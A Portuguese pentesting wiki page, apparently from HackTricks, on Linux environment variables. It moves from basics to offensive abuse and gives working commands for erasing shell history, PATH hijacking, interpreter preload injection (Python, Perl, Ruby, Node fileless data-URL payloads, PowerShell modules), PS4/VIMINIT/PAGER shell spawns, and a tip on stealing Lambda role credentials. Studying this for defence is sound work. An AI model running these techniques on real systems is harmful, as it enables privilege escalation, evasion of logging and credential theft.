# Variáveis de ambiente do Linux

{{#include ../../banners/hacktricks-training.md}}

## Variáveis globais

As variáveis globais **serão** herdadas pelos **processos filhos**.

Você pode criar uma variável global para sua sessão atual fazendo:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Essa variável ficará acessível às suas sessões atuais e aos processos filhos delas.

Você pode **remover** uma variável fazendo:

```bash
unset MYGLOBAL
```

## Variáveis locais

As **variáveis locais** só podem ser **acessadas** pelo **shell/script atual**.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Listar variáveis atuais

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

O conteúdo de `/proc/*/environ` é **separado por NUL**, então estas variantes costumam ser mais fáceis de ler:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

Se você está procurando **credenciais** ou **configurações de serviço interessantes** em ambientes herdados, consulte também [Linux Post Exploitation](../post-exploitation/README.md).

## Variáveis comuns

Fonte: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – o display usado pelo **X**. Essa variável geralmente é definida como **:0.0**, o que significa o primeiro display no computador atual.
- **EDITOR** – o editor de texto preferido do usuário.
- **HISTFILESIZE** – o número máximo de linhas contidas no arquivo de histórico.
- **HISTSIZE** – número de linhas adicionadas ao arquivo de histórico quando o usuário encerra a sessão.
- **HOME** – seu diretório pessoal.
- **HOSTNAME** – o hostname do computador.
- **LANG** – seu idioma atual.
- **MAIL** – o local do spool de e-mail do usuário. Geralmente **/var/spool/mail/USER**.
- **MANPATH** – a lista de diretórios nos quais procurar páginas de manual.
- **OSTYPE** – o tipo de sistema operacional.
- **PS1** – o prompt padrão no bash.
- **PATH** – armazena o caminho de todos os diretórios que contêm arquivos binários que você quer executar especificando apenas o nome do arquivo, e não um caminho relativo ou absoluto.
- **PWD** – o diretório de trabalho atual.
- **SHELL** – o caminho para o shell de comandos atual (por exemplo, **/bin/bash**).
- **TERM** – o tipo de terminal atual (por exemplo, **xterm**).
- **TZ** – seu fuso horário.
- **USER** – seu nome de usuário atual.

## Variáveis interessantes para hacking

Nem todas as variáveis são igualmente úteis. De uma perspectiva ofensiva, priorize as variáveis que alteram **caminhos de pesquisa**, **arquivos de inicialização**, **comportamento do dynamic linker** ou **auditoria/logging**.

### **HISTFILESIZE**

Altere o **valor desta variável para 0** para que, quando você **encerrar a sessão**, o **arquivo de histórico** (\~/.bash_history) seja **truncado para 0 linhas**.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

Altere o **valor desta variável para 0**, para que os comandos **não sejam mantidos no histórico em memória** e não sejam gravados novamente no **arquivo de histórico** (\~/.bash_history).

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

Se **o valor desta variável estiver definido como `ignorespace` ou `ignoreboth`**, qualquer comando precedido por um espaço extra não será salvo no histórico.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

Aponte o **arquivo de histórico** para **`/dev/null`** ou remova completamente a variável. Isso costuma ser mais confiável do que apenas alterar o tamanho do histórico.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

Os processos usarão o **proxy** declarado aqui para se conectar à internet por meio de **http ou https**.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: proxy padrão para ferramentas/protocolos que respeitam essa configuração.
- `no_proxy`: lista de bypass (hosts/domínios/CIDRs) que devem se conectar diretamente.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

As variantes em minúsculas e maiúsculas podem ser usadas, dependendo da ferramenta (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Os processos confiarão nos certificados indicados **nessas variáveis de ambiente**. Isso é útil para fazer com que ferramentas como **`curl`**, **`git`**, clientes HTTP do Python ou gerenciadores de pacotes confiem em uma CA controlada pelo invasor (por exemplo, para fazer um proxy de interceptação parecer legítimo).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

Se um wrapper/script privilegiado executar comandos **sem caminhos absolutos**, vence o **primeiro diretório controlado pelo atacante** em `PATH`. Essa é a primitiva por trás de muitos **PATH hijacks** em `sudo`, jobs do cron, wrappers de shell e helpers SUID personalizados. Procure por `env_keep+=PATH`, `secure_path` fraco ou wrappers que chamam `tar`, `service`, `cp`, `python` etc. pelo nome.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

Para ver cadeias completas de escalada de privilégios que exploram `PATH`, consulte [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` não é apenas uma referência a diretório: muitas ferramentas carregam automaticamente **dotfiles**, **plugins** e **configurações por usuário** de `$HOME` ou `$XDG_CONFIG_HOME`. Se um fluxo de trabalho privilegiado preservar esses valores, a **injeção de configuração** pode ser mais fácil.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Alvos interessantes incluem `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` e arquivos específicos de ferramentas, como `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Estas variáveis influenciam o **linker dinâmico**:

- `LD_PRELOAD`: força o carregamento antecipado de objetos compartilhados adicionais.
- `LD_LIBRARY_PATH`: adiciona diretórios ao início da lista de busca por bibliotecas.
- `LD_AUDIT`: carrega bibliotecas de auditoria que observam o carregamento de bibliotecas e a resolução de símbolos.

Elas são extremamente valiosas para **hooking**, **instrumentação** e **escalada de privilégios** se um comando privilegiado as preservar. No modo de **execução segura** (`AT_SECURE`, por exemplo, com setuid/setgid/capabilities), o loader remove ou restringe muitas dessas variáveis. No entanto, bugs no parser durante esse estágio inicial do loader ainda podem ter grande impacto, pois são executados **antes do programa-alvo**.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` altera o comportamento inicial da glibc (por exemplo, os parâmetros do alocador) e é muito útil em laboratórios de exploit. Também é relevante do ponto de vista da segurança porque o **dynamic loader a analisa muito cedo**. A vulnerabilidade **Looney Tunables**, de 2023, foi um bom lembrete de que uma única variável de ambiente analisada pelo loader pode se tornar um **primitive de escalação de privilégios local** contra programas SUID.<sup>[[6]](#references)</sup>

Para a CVE-2023-4911, compare a **versão do pacote da distribuição instalada** com a versão corrigida pelo fornecedor e verifique qual loader é realmente usado em novos processos. Confiar apenas no número da versão upstream não é seguro: o Debian fez backport do parser vulnerável para o pacote 2.31, enquanto outras distribuições fizeram backport das correções sem alterar o número upstream. Uma transição de privilégios também exige um executável privilegiado cujo processo de alteração de identidade não seja bloqueado por `NoNewPrivs`, por uma montagem `nosuid` ou por outra mitigação. Evite executar uma sonda de falha com `GLIBC_TUNABLES` malformada durante a enumeração passiva. Consulte o [rastreador do Ubuntu](https://ubuntu.com/security/CVE-2023-4911), o [rastreador do Debian](https://security-tracker.debian.org/tracker/CVE-2023-4911) e o [aviso da Red Hat](https://access.redhat.com/security/cve/cve-2023-4911) para verificar a aplicabilidade a cada versão; o [aviso de segurança](https://ubuntu.com/security/notices/USN-6409-1) do Ubuntu também recomenda reiniciar após a atualização.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

Se o **Bash** for iniciado **de forma não interativa**, ele verifica `BASH_ENV` e carrega esse arquivo antes de executar o script de destino. Quando o Bash é invocado como `sh` ou em modo interativo no estilo POSIX, `ENV` também pode ser consultado. Essa é uma maneira clássica de transformar um wrapper de shell em execução de código quando o ambiente é controlado pelo atacante.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

O Bash ignora esses arquivos de inicialização quando os **IDs real/efetivo são diferentes**; `-p` preserva o ID efetivo, mas não habilita esses arquivos de inicialização, então o comportamento exato depende de como o wrapper invoca o shell. Tenha cuidado com wrappers privilegiados que chamam `setuid()`/`setgid()` **antes** de iniciar o Bash: quando os IDs voltam a coincidir, o Bash pode confiar em `BASH_ENV`, `ENV` e em estados relacionados do shell que, de outra forma, seriam ignorados.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Quando o Bash é executado com **xtrace** habilitado, ele expande `PS4` e o imprime antes de cada comando rastreado. `PS4` é expandido como um prompt, então uma **substituição de comando** dentro dele é executada. O ponto crucial é que o próprio xtrace pode ser ativado apenas pelo ambiente, exportando `SHELLOPTS=xtrace` — não é necessário usar `-x` na linha de comando —, então qualquer script Bash executado pela vítima se torna execução de código.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` não faz nada até que xtrace esteja ativo (`SHELLOPTS=xtrace`, `set -x` ou `bash -x`), e o Bash descarta `SHELLOPTS` em contextos privilegiados/setuid, assim como `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Estas variáveis alteram a inicialização do Python:

- `PYTHONPATH`: adiciona caminhos de busca de importação no início.
- `PYTHONHOME`: realoca a árvore da biblioteca padrão.
- `PYTHONSTARTUP`: executa um arquivo antes do prompt interativo.
- `PYTHONINSPECT=1`: entra no modo interativo após a execução de um script.
- `PYTHONBREAKPOINT`: `package.module.callable` é chamado (e seu módulo importado) quando o código chega a `breakpoint()`.<sup>[[8]](#references)</sup>

Elas são úteis contra scripts de manutenção, debuggers, shells e wrappers que chamam Python com um ambiente controlável. `python -E` e `python -I` ignoram todas as variáveis `PYTHON*`.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

Um exemplo recente do mundo real foi o LPE do **needrestart** em 2024 em sistemas Ubuntu/Debian: o scanner, de propriedade do root, copiava o `PYTHONPATH` de um processo sem privilégios a partir de `/proc/<PID>/environ` e, em seguida, executava Python. O exploit publicado colocou `importlib/__init__.so` no caminho controlado pelo atacante, fazendo com que Python executasse código do atacante durante sua própria inicialização, antes mesmo que o script fixo do helper tivesse importância.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

O Perl tem variáveis de inicialização igualmente úteis:

- `PERL5LIB`: adiciona diretórios de bibliotecas ao início da lista.
- `PERL5OPT`: injeta opções como se estivessem na linha de comando de todo comando `perl`.

Isso pode forçar o **carregamento automático de módulos** ou alterar o comportamento do interpretador antes que o script-alvo faça qualquer coisa interessante. O Perl ignora essas variáveis em contextos de **taint / setuid / setgid**, mas elas ainda são muito relevantes para wrappers executados normalmente como root, jobs de CI, instaladores e regras personalizadas do sudoers.

Se uma regra do sudo permitir substituições de ambiente e o comando privilegiado acabar iniciando o Perl, verifique também `PERL5DB`. A documentação do Perl informa que `PERL5OPT=-d` inicia o debugger e que `PERL5DB` fornece código de inicialização do debugger quando o Perl é iniciado com a opção `-d` isolada. Remover apenas `PERL5LIB` e `PERLLIB` não elimina esse caminho. As variáveis precisam sobreviver ao sudo e ao wrapper, e o processo Perl não pode ignorá-las por causa do tratamento de taint ou de set-ID; inspecione a regra e a cadeia de execução exatas sem executar o helper privilegiado durante a enumeração. Consulte [perlrun's environment-variable reference](https://perldoc.perl.org/perlrun#ENVIRONMENT).

O caminho de pesquisa interno [`@INC` do Perl](https://perldoc.perl.org/perlvar#@INC) é outro limite de confiança para módulos, mesmo sem variáveis de ambiente preservadas. Para um processo Perl privilegiado, correlacione uma instrução `use` ou `require` efetivamente executada com o nome do módulo resolvido, a ordem de pesquisa e a capacidade de um usuário com menos privilégios de criar ou substituir esse módulo em um diretório pesquisado. O simples fato de um diretório de bibliotecas permitir gravação não comprova que o processo privilegiado carregará código dele.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS` acrescenta **flags da CLI do Node.js** a cada processo `node` que herda o ambiente. Isso o torna útil contra wrappers, jobs de CI, helpers do Electron e regras do sudo que acabam invocando o Node. As flags mais interessantes em cenários ofensivos geralmente são:

- `--require <file>`: pré-carrega um arquivo CommonJS antes do script de destino.
- `--import <module>`: pré-carrega um módulo ES antes do script de destino.

O Node rejeita algumas flags perigosas em `NODE_OPTIONS`, mas `--require` e `--import` são explicitamente permitidas e são processadas **antes** dos argumentos normais da linha de comando.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### Preload sem arquivo com uma URL `data:`

Quando você pode definir `NODE_OPTIONS`, mas **não pode gravar um arquivo** no alvo (filesystem somente leitura, API restrita, runtime serverless etc.), `--import` aceita uma URL `data:text/javascript,`, então todo o payload fica dentro da própria variável de ambiente. O JavaScript precisa estar **totalmente codificado para URL** — o Node interpreta o valor como uma URL, então qualquer espaço bruto (ou outro caractere não codificado) trunca o payload e gera um `SyntaxError`. Isso funciona no Node 20.6+, em que `--import` está na lista de opções permitidas para `NODE_OPTIONS`.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> Esta é uma forma comum de transformar o controle de `NODE_OPTIONS` em RCE em **runtimes de cloud gerenciados** cujas funções executam Node. Por exemplo, um invasor que só pode alterar a configuração de uma Lambda (`lambda:UpdateFunctionConfiguration`, sem `iam:PassRole` nem atualização de código) pode injetar `NODE_OPTIONS=--import data:text/javascript,<payload>` para executar código dentro da função e roubar as credenciais da execution role. O módulo injetado é executado **antes** do handler, que ainda é executado normalmente em seguida.

Para cadeias de gadgets remotas que definem `NODE_OPTIONS` indiretamente (por exemplo, prototype pollution para RCE), consulte [esta outra página](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby oferece a mesma classe de abuso na inicialização:

- `RUBYLIB`: adiciona diretórios ao início do load path do Ruby.
- `RUBYOPT`: injeta opções de linha de comando, como `-r`, em toda invocação de `ruby`.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

As vulnerabilidades do **needrestart** de 2024 mostraram que isso não é apenas um truque de laboratório: o mesmo helper pertencente ao root, vulnerável ao abuso de `PYTHONPATH`, também podia ser induzido a executar Ruby com um `RUBYLIB` controlado pelo invasor, carregando `enc/encdb.so` de um diretório do invasor.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

O Vim/Neovim executa os comandos Ex contidos em `VIMINIT` (ou em sua alternativa `EXINIT`) durante uma inicialização normal. Os comandos Ex incluem `:!cmd` e `:call system(...)`, portanto, controlar a variável permite a execução de código sempre que uma vítima abre o Vim (um `sudo vim` como root, `crontab -e`, `visudo`, `git`/`less` iniciando `$EDITOR` etc.).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

O modo em lote (`vim -es`/`-Es`) ignora essas variáveis, mas uma inicialização interativa normal as executa.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS e profiler CLR**

O PowerShell Core (`pwsh`) é executado no Linux/macOS (e no Windows) e é um **aplicativo .NET**; por isso, várias variáveis de ambiente transformam qualquer invocação de `pwsh` com um ambiente herdado em execução de código — algo útil contra tarefas cron/jobs do systemd, runners de CI e wrappers privilegiados que chamam `pwsh`.

- `PSModulePath`: o PowerShell pesquisa recursivamente todos os diretórios dessa lista em busca de módulos `.psd1`/`.psm1` e **carrega automaticamente** um deles na primeira vez que um comando exportado é referenciado. Acrescente um diretório ao início da lista e o código de nível superior do seu módulo será executado durante a importação; como a resolução segue a ordem *Alias → Function → Cmdlet*, uma função exportada pode até se sobrepor a um cmdlet integrado chamado pela vítima.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: redireciona `powershell/Microsoft.PowerShell_profile.ps1`, executado na inicialização (a menos que seja usado `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: assembly gerenciado cujo `StartupHook.Initialize()` é executado antes de `Main` (compartilhado por todos os aplicativos .NET).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: a API de profiling do CLR carrega uma biblioteca do atacante no processo durante a inicialização (variáveis de caminho têm prioridade sobre o registro; `DOTNET_*` é o alias mais recente). No Windows PowerShell 5.1 (.NET Framework), use `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

No Windows, `PSExecutionPolicyPreference=Bypass` também remove a proteção que bloqueia scripts não assinados, fazendo com que um perfil/módulo implantado realmente seja executado. Veja a página dedicada para PoCs completos:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Algumas ferramentas não apenas leem um caminho do ambiente; elas passam o valor para um **shell**, um **editor** ou um **pré-processador de entrada**. Isso torna as seguintes variáveis especialmente interessantes quando um wrapper privilegiado executa `git`, `man`, `less` ou visualizadores de texto semelhantes:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: escolhem o comando do pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: escolhem o comando do editor, geralmente com argumentos.
- `LESSOPEN`, `LESSCLOSE`: definem pré/pós-processadores executados quando `less` abre um arquivo.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

O Git também oferece suporte à **injeção de configuração apenas por variáveis de ambiente**, sem tocar no disco, por meio de `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` e `GIT_CONFIG_VALUE_<n>`:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

Do ponto de vista da pós-exploração, lembre-se também de que ambientes herdados geralmente contêm **credenciais**, **configurações de proxy**, **tokens de serviço** ou **chaves de cloud**. Consulte [Pós-exploração no Linux](../post-exploitation/README.md) para procurar `/proc/<PID>/environ` e `Environment=` do `systemd`.

### PS1

Altere a aparência do prompt.

[**Este é um exemplo**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Este é um exemplo](<../images/image (897).png>)

Usuário comum:

![PERL5OPT & PERL5LIB - PS1: Um, dois e três jobs em segundo plano](<../images/image (740).png>)

Um, dois e três jobs em segundo plano:

![PERL5OPT & PERL5LIB - PS1: Um, dois e três jobs em segundo plano](<../images/image (145).png>)

Um job em segundo plano, um suspenso e o último comando não foi concluído corretamente:

![PERL5OPT & PERL5LIB - PS1: Um job em segundo plano, um suspenso e o último comando não foi concluído corretamente](<../images/image (715).png>)

## References

- [1] [Manual do GNU Bash - Arquivos de inicialização do Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Página de manual do Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs no needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Documentação da CLI do Node.js - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Variáveis de ambiente comuns - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Escalonamento de privilégios local em ld.so da glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Manual do GNU Bash - Variáveis do Bash (`PS4`) e o builtin Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - breakpoint() integrado e PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Documentação do Vim - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath e carregamento automático de módulos do PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Configurações de depuração e criação de perfil do .NET (variáveis de criação de perfil `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
